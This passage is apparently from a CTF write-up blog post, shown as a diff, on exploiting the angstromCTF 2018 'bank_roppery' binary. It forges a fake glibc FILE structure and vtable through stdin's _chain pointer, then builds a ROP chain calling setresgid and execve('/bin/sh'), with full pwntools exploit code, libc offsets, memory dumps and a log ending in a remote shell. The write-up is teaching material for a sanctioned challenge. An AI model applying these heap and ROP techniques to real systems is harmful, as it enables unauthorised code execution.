+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_ptr</span><span class="p">;</span> <span class="cm">/* Current read pointer */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_end</span><span class="p">;</span> <span class="cm">/* End of get area. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_base</span><span class="p">;</span>  <span class="cm">/* Start of putback+get area. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_base</span><span class="p">;</span> <span class="cm">/* Start of put area. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_ptr</span><span class="p">;</span>  <span class="cm">/* Current put pointer. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_end</span><span class="p">;</span>  <span class="cm">/* End of put area. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_base</span><span class="p">;</span> <span class="cm">/* Start of reserve area. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_end</span><span class="p">;</span>  <span class="cm">/* End of reserve area. */</span>
+  <span class="cm">/* The following fields are used to support backing up and undo. */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span> <span class="cm">/* Pointer to start of non-current get area. */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>  <span class="cm">/* Pointer to first valid character of backup area */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span> <span class="cm">/* Pointer to end of non-current get area. */</span>
+
+  <span class="k">struct</span> <span class="n">_IO_marker</span> <span class="o">*</span><span class="n">_markers</span><span class="p">;</span>
+
+  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_chain</span><span class="p">;</span>
+
+  <span class="kt">int</span> <span class="n">_fileno</span><span class="p">;</span></code></pre></figure>
+
+<p>When the application exits, it will call <code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp</code> to clean up file handles.</p>
+
+<p>For iterating all open file structures, it takes the first file pointer from <code class="language-plaintext highlighter-rouge">_IO_list_all</code> (pointing to <code class="language-plaintext highlighter-rouge">stderr</code>). It will do some checks, eventually calling some cleanup methods and then try to continue with the next file structure. The next open file structure should be stored in the <code class="language-plaintext highlighter-rouge">_chain</code> ptr of the current one, so it will continue with that until <code class="language-plaintext highlighter-rouge">_chain</code> is <code class="language-plaintext highlighter-rouge">NULL</code> (no more files to check).</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">fp</span> <span class="o">=</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="p">)</span> <span class="n">_IO_list_all</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span><span class="n">fp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">run_fp</span> <span class="o">=</span> <span class="n">fp</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">do_lock</span><span class="p">)</span>
+  <span class="n">_IO_flockfile</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+
+      <span class="k">if</span> <span class="p">(((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>     <span class="p">)</span>
+    <span class="o">&amp;&amp;</span> <span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">EOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="n">EOF</span><span class="p">;</span>
+
+      <span class="k">if</span> <span class="p">(</span><span class="n">do_lock</span><span class="p">)</span>
+  <span class="n">_IO_funlockfile</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+      <span class="n">run_fp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+      <span class="k">if</span> <span class="p">(</span><span class="n">last_stamp</span> <span class="o">!=</span> <span class="n">_IO_list_all_stamp</span><span class="p">)</span>
+  <span class="p">{</span>    
+    <span class="n">fp</span> <span class="o">=</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="p">)</span> <span class="n">_IO_list_all</span><span class="p">;</span>
+    <span class="n">last_stamp</span> <span class="o">=</span> <span class="n">_IO_list_all_stamp</span><span class="p">;</span>
+  <span class="p">}</span>
+      <span class="k">else</span>
+  <span class="n">fp</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_chain</span><span class="p">;</span>     <span class="c1">// Get next file ptr from chain</span>
+    <span class="p">}</span></code></pre></figure>
+
+<p>Did the last sentence sound intriguing? Right, the <code class="language-plaintext highlighter-rouge">_chain</code> ptr of <code class="language-plaintext highlighter-rouge">stdin</code> will be <code class="language-plaintext highlighter-rouge">0x0</code>, since it’s the last open file structure. And we are able to write a heap address to an arbitrary address, which contains <code class="language-plaintext highlighter-rouge">0x0</code>. Gotcha…</p>
+
+<p>Thus, we can create a <code class="language-plaintext highlighter-rouge">check</code> to overwrite the <code class="language-plaintext highlighter-rouge">next</code> ptr in our object <code class="language-plaintext highlighter-rouge">3</code> with the address of <code class="language-plaintext highlighter-rouge">_chain</code> in <code class="language-plaintext highlighter-rouge">stdin</code> (better said <code class="language-plaintext highlighter-rouge">_chain-0x84</code>, since we overwrite its <code class="language-plaintext highlighter-rouge">next</code> ptr). The next object allocation will then create an object on the heap and store its address in stdins <code class="language-plaintext highlighter-rouge">_chain</code>.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">if</span> <span class="p">(((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>     <span class="p">)</span>
+    <span class="o">&amp;&amp;</span> <span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">EOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span></code></pre></figure>
+
+<p>On a later exit, <code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp</code> will thus handle the <code class="language-plaintext highlighter-rouge">_chain</code> ptr of <code class="language-plaintext highlighter-rouge">stdin</code> as another file structure and happily apply the code above on it.</p>
+
+<p>If we’re able to fulfill</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span></code></pre></figure>
+
+<p>it will execute</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">EOF</span><span class="p">)</span></code></pre></figure>
+
+<p>which is just a macro to call the <code class="language-plaintext highlighter-rouge">overflow</code> function from the <code class="language-plaintext highlighter-rouge">vtable</code> of the file structure.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#define _IO_JUMPS(THIS) (THIS)-&gt;vtable
+</span>
+<span class="cp">#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)
+</span>
+<span class="cp">#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></code></pre></figure>
+
+<p>Let’s sum it up:</p>
+
+<ul>
+  <li>Overwrite <code class="language-plaintext highlighter-rouge">next</code> ptr of object <code class="language-plaintext highlighter-rouge">3</code> with <code class="language-plaintext highlighter-rouge">_chain-0x84</code> of <code class="language-plaintext highlighter-rouge">stdin</code></li>
+  <li>Next object allocation will create an object on the heap and write its address into <code class="language-plaintext highlighter-rouge">_chain</code> of <code class="language-plaintext highlighter-rouge">stdin</code></li>
+  <li>If <code class="language-plaintext highlighter-rouge">_IO_write_ptr</code> in our fake file struct on the heap is bigger than <code class="language-plaintext highlighter-rouge">_IO_write_base</code> it will try to use the (fake) <code class="language-plaintext highlighter-rouge">vtable</code> entry in our fake structure to call <code class="language-plaintext highlighter-rouge">vtable-&gt;__overflow</code></li>
+</ul>
+
+<p>Thus, we just have to forge a proper fake file struct on the heap, to be able to call an arbitrary function, which will get the address of the file struct as its first argument.</p>
+
+<p>At this point, I just tried this to call <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>, which will give you a shell on the system… But you won’t be in the right usergroup and not able to access the flag. We have to call <code class="language-plaintext highlighter-rouge">setresgid</code> before. In the end I opted to use the <code class="language-plaintext highlighter-rouge">_IO_file</code> approach to do a <code class="language-plaintext highlighter-rouge">gets(rsp)</code>, writing a ropchain, which will call <code class="language-plaintext highlighter-rouge">setresgid</code> and then <code class="language-plaintext highlighter-rouge">execve("/bin/sh")</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python">  
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">LIBCLEAK</span> <span class="o">-</span> <span class="mh">0x3c4c08</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite next ptr in chunk with ptr to chain ptr of stdin"</span><span class="p">)</span> 
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"E"</span><span class="o">*</span><span class="mi">20</span>  
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">LIBCLEAK</span><span class="o">-</span><span class="mh">0x2c0</span><span class="o">-</span><span class="mh">0x84</span><span class="p">)[:</span><span class="mi">7</span><span class="p">]</span>   <span class="c1"># address of stdin._chain
+</span>
+<span class="n">check</span><span class="p">(</span><span class="s">"200.0"</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">30</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">30</span><span class="p">,</span> <span class="s">"D"</span><span class="o">*</span><span class="mi">30</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite chain ptr in stdin with ptr to next stored chunk (and fill with IO_file struct)"</span><span class="p">)</span>
+  
+<span class="c1"># mov rdi, rsp, call qword ptr [rax+0x20h]
+</span><span class="n">CALLGETS</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x12b86b</span>    
+<span class="n">RET</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xae876</span>    <span class="c1"># ret
+</span>  
+<span class="n">payload1</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)[:</span><span class="mi">7</span><span class="p">]</span>
+
+<span class="n">payload2</span> <span class="o">=</span>  <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">RET</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> 
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">CALLGETS</span><span class="p">)[:</span><span class="mi">7</span><span class="p">]</span>  
+
+<span class="n">payload3</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"gets"</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>       <span class="c1"># next chain
+</span><span class="n">payload3</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)[:</span><span class="mi">7</span><span class="p">]</span>
+  
+<span class="n">store2</span><span class="p">(</span><span class="s">"100.0"</span><span class="p">,</span> <span class="n">payload1</span><span class="p">,</span> <span class="n">payload2</span><span class="p">,</span> <span class="n">payload3</span><span class="p">)</span>
+
+<span class="n">payload1</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    
+<span class="n">payload2</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)[:</span><span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPLEAK</span> <span class="o">+</span> <span class="mh">0x328</span><span class="o">-</span><span class="mh">0x18</span><span class="p">)</span>   <span class="c1"># vtable
+</span><span class="n">payload2</span> <span class="o">+=</span> <span class="s">"C"</span><span class="o">*</span><span class="p">(</span><span class="mi">64</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload2</span><span class="p">))</span>
+
+<span class="n">store2</span><span class="p">(</span><span class="s">"100.0"</span><span class="p">,</span> <span class="n">payload1</span><span class="p">,</span> <span class="n">payload2</span><span class="p">,</span> <span class="n">payload3</span><span class="p">)</span></code></pre></figure>
+
+<p>Storing the <code class="language-plaintext highlighter-rouge">ret</code> gadget in <code class="language-plaintext highlighter-rouge">_IO_write_ptr</code> was just coincidentally, since I needed to put it somewhere for later use in the rop chain. As long as <code class="language-plaintext highlighter-rouge">_IO_write_ptr</code> &gt; <code class="language-plaintext highlighter-rouge">_IO_write_base</code>, everything’s fine ;)</p>
+
+<p>This will create the following fake file structure on the heap.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">x/30gx 0x604370-0x10
+0x604370: 0x0000000000000000  0x0000000000000000 &lt;== fp
+0x604380: 0x0000000000000000  0x0000000000000000
+0x604390: 0x0000000000000000  0x00007ffff7abb876 &lt;== _IO_write_base / _IO_write_ptr (also RET gadget)
+0x6043a0: 0x0000000000000000  0x0000000000000000
+0x6043b0: 0x0000000000000000  0x0000000000000000
+0x6043c0: 0x0000000000000008  0x00007ffff7b3886b &lt;== ptr to CALLGETS gadget
+0x6043d0: 0x00007ffff7a7bd80  0x0000000000000000 &lt;== ptr to gets
+0x6043e0: 0x0000000000000000  0x00ffffffffffffff
+0x6043f0: 0x0060441042c80000  0x0000000000000000
+0x604400: 0x0000000000000000  0x00000000000000a1
+0x604410: 0x0000000000000000  0x0000000000000000
+0x604420: 0x0000000000000000  0x0000000000000000
+0x604430: 0x0000000000000000  0x0000000000000000
+0x604440: 0x0000000000000000  0x00000000006043b0 &lt;== fake vtable address
+0x604450: 0x4343434343434343  0x4343434343434343
+0x604460: 0x4343434343434343  0x0043434343434343
+0x604470: 0x7ffff7a7bd804343  0x0000000000000000
+
+x/30gx 0x00007ffff7dd18e0
+0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;:      0x00000000fbad208b  0x00007ffff7dd1963
+0x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;:   0x00007ffff7dd1963  0x00007ffff7dd1963
+0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;:   0x00007ffff7dd1963  0x00007ffff7dd1963
+0x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;:   0x00007ffff7dd1963  0x00007ffff7dd1963
+0x7ffff7dd1920 &lt;_IO_2_1_stdin_+64&gt;:   0x00007ffff7dd1964  0x0000000000000000
+0x7ffff7dd1930 &lt;_IO_2_1_stdin_+80&gt;:   0x0000000000000000  0x0000000000000000
+0x7ffff7dd1940 &lt;_IO_2_1_stdin_+96&gt;:   0x0000000000000000  0x0000000000604370   &lt;== _chain pointing to our fake file
+0x7ffff7dd1950 &lt;_IO_2_1_stdin_+112&gt;:  0x0000000000000000  0xffffffffffffffff
+0x7ffff7dd1960 &lt;_IO_2_1_stdin_+128&gt;:  0x00000000ff000000  0x00007ffff7dd3790
+0x7ffff7dd1970 &lt;_IO_2_1_stdin_+144&gt;:  0xffffffffffffffff  0x0000000000000000
+0x7ffff7dd1980 &lt;_IO_2_1_stdin_+160&gt;:  0x00007ffff7dd19c0  0x0000000000000000
+0x7ffff7dd1990 &lt;_IO_2_1_stdin_+176&gt;:  0x0000000000000000  0x0000000000000000
+0x7ffff7dd19a0 &lt;_IO_2_1_stdin_+192&gt;:  0x00000000ffffffff  0x0000000000000000
+0x7ffff7dd19b0 &lt;_IO_2_1_stdin_+208&gt;:  0x0000000000000000  0x00007ffff7dd06e0</code></pre></figure>
+
+<p>Sooooooo. When we exit the program, it will</p>
+
+<ul>
+  <li>call <code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp</code></li>
+  <li>iterate through the file handles arriving at our fake chunk</li>
+  <li>comparing <code class="language-plaintext highlighter-rouge">_IO_write_ptr</code> to <code class="language-plaintext highlighter-rouge">_IO_write_base</code>, and since it’s bigger, calls <code class="language-plaintext highlighter-rouge">vtable-&gt;overflow</code></li>
+  <li>our <code class="language-plaintext highlighter-rouge">vtable</code> points to 0x60403b0</li>
+  <li>The function pointer for <code class="language-plaintext highlighter-rouge">overflow</code> is at <code class="language-plaintext highlighter-rouge">vtable + 0x18</code> (in this example <code class="language-plaintext highlighter-rouge">0x6043c8</code>)</li>
+  <li>We put the address to our call gadget at <code class="language-plaintext highlighter-rouge">0x6043c8</code>, so this will now call</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-asm" data-lang="asm">mov rdi, rsp;
+call qword ptr [rax+0x20h]</code></pre></figure>
+
+<ul>
+  <li>At this point <code class="language-plaintext highlighter-rouge">rax</code> will contain our fake <code class="language-plaintext highlighter-rouge">vtable</code>, so it will call <code class="language-plaintext highlighter-rouge">vtable + 0x20</code>, which is <code class="language-plaintext highlighter-rouge">0x6043d0</code>. That’s the reason we stored <code class="language-plaintext highlighter-rouge">gets</code> there.</li>
+  <li>So this will basically just call <code class="language-plaintext highlighter-rouge">gets(rsp)</code>, allowing us to put a huge ropchain there, which makes exploitation a lot easier now.</li>
+  <li>After the call to get, the gadget will do an</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-asm" data-lang="asm">mov    rax,QWORD PTR [rsp+0x8]
+mov    rax,QWORD PTR [rax+0x38]
+...
+call   rax
+add    rsp,0x30
+pop    rbx</code></pre></figure>
+
+<ul>
+  <li>So, we just put the address of a <code class="language-plaintext highlighter-rouge">ret</code> gadget at <code class="language-plaintext highlighter-rouge">rsp+0x8</code> and fillup the ropchain because of <code class="language-plaintext highlighter-rouge">add rsp, 0x30; pop rbx</code>.</li>
+</ul>
+
+<p>The problem with just executing <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code> was, that we were missing the right user group to read the flag, but with being able to rop, this shouldn’t be a problem anymore.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Exit will trigger our fake IO_file =&gt; gets(rsp)"</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"5"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">()</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Send ropchain (setresgid + execve)"</span><span class="p">)</span>
+
+<span class="n">POPRAX</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x0000000000033544</span>
+<span class="n">POPRDI</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x0000000000021102</span>
+<span class="n">POPRSI</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x00000000000202e8</span>
+<span class="n">POPRDX</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x0000000000001b92</span>
+<span class="n">SYSCALL</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x00000000000bc375</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPLEAK</span> <span class="o">+</span> <span class="mh">0x2f8</span> <span class="o">-</span> <span class="mh">0x38</span><span class="p">)</span>  <span class="c1"># gadget will call rax+0x38 (=&gt; ret)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">*</span><span class="mi">5</span>
+
+<span class="c1"># setresgid (1011, 1011, 1011)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">119</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1011</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRSI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1011</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1011</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
+
+<span class="c1"># execve("/bin/sh")
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">59</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRSI</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">()</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+<p>The ropchain calls <code class="language-plaintext highlighter-rouge">setresgid(1011, 1011, 1011)</code> to fix our usergroup and then <code class="language-plaintext highlighter-rouge">execve("/bin/sh")</code>, which pops a shell.</p>
+
+<p>If trying this locally, you’ll see that <code class="language-plaintext highlighter-rouge">stdin</code> and <code class="language-plaintext highlighter-rouge">stdout</code> will already be closed, so you won’t be able to get any output from the shell.</p>
+
+<p>But since we’re connecting remotely via <code class="language-plaintext highlighter-rouge">ssh</code>, we’ll still have a socket fd for input/output, so this isn’t a problem.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] '/vagrant/Challenges/angstrom/pwn/bankrop/b/bank_roppery'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] '/vagrant/Challenges/angstrom/pwn/bankrop/b/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Connecting to shell.angstromctf.com on port 22: Done
+[!] Couldn't check security settings on 'shell.angstromctf.com'
+[+] Opening new channel: 'rm .account': Done
+[+] Opening new channel: 'rm .password': Done
+[+] Opening new channel: 'rm -rf ZZZZZZZZ1': Done
+[+] Starting remote process './bank_roppery' on shell.angstromctf.com: pid 28979
+[*] Create initial chunks
+[*] Free some chunks to fill unsorted bin list
+[*] Create chunk (free it before filling to get a leak on FD/BK)
+[*] Leak heap address via chunk 3
+[*] Store another chunk to get main_arena ptr into freed chunk
+[*] Leak LIBC via chunk 3
+[*] HEAPLEAK         : 0x9df0a0
+[*] LIBCLEAK         : 0x7fe22ac04c08
+[*] Overwrite next ptr in chunk with ptr to chain ptr of stderr
+[*] Overwrite chain ptr in stderr with ptr to next stored chunk (and fill with IO_file struct)
+[*] Exit will trigger our fake IO_file =&gt; gets(rsp)
+[*] Send ropchain (setresgid + execve)
+[*] Switching to interactive mode
+ &gt; &gt; $ $ id
+uid=2034(team422720) gid=1011(problem-bank_roppery) groups=1011(problem-bank_roppery),1000(teams)
+$ $ cat /problems/bank_roppery/flag
+actf{the_yuge_banks_should_be_broken_into_little_pieces}</code></pre></figure>
+
+<p>Only problem left, the webpage didn’t want to accept the flag.</p>
+
+<p>Thanks to <code class="language-plaintext highlighter-rouge">kmh11</code> from irc for fixing this issue, resulting in the last pwn challenge being solved :)</p>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=angstromCTF 2018 - bank_roppery&amp;url=https://kileak.github.io/ctf/2018/angstrom-bank_roppery/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2018/angstrom-bank_roppery/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2018/angstrom-bank_roppery';
+        var disqus_title = 'angstromCTF 2018 - bank_roppery';
+        var disqus_url = 'https://kileak.github.io/ctf/2018/angstrom-bank_roppery';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
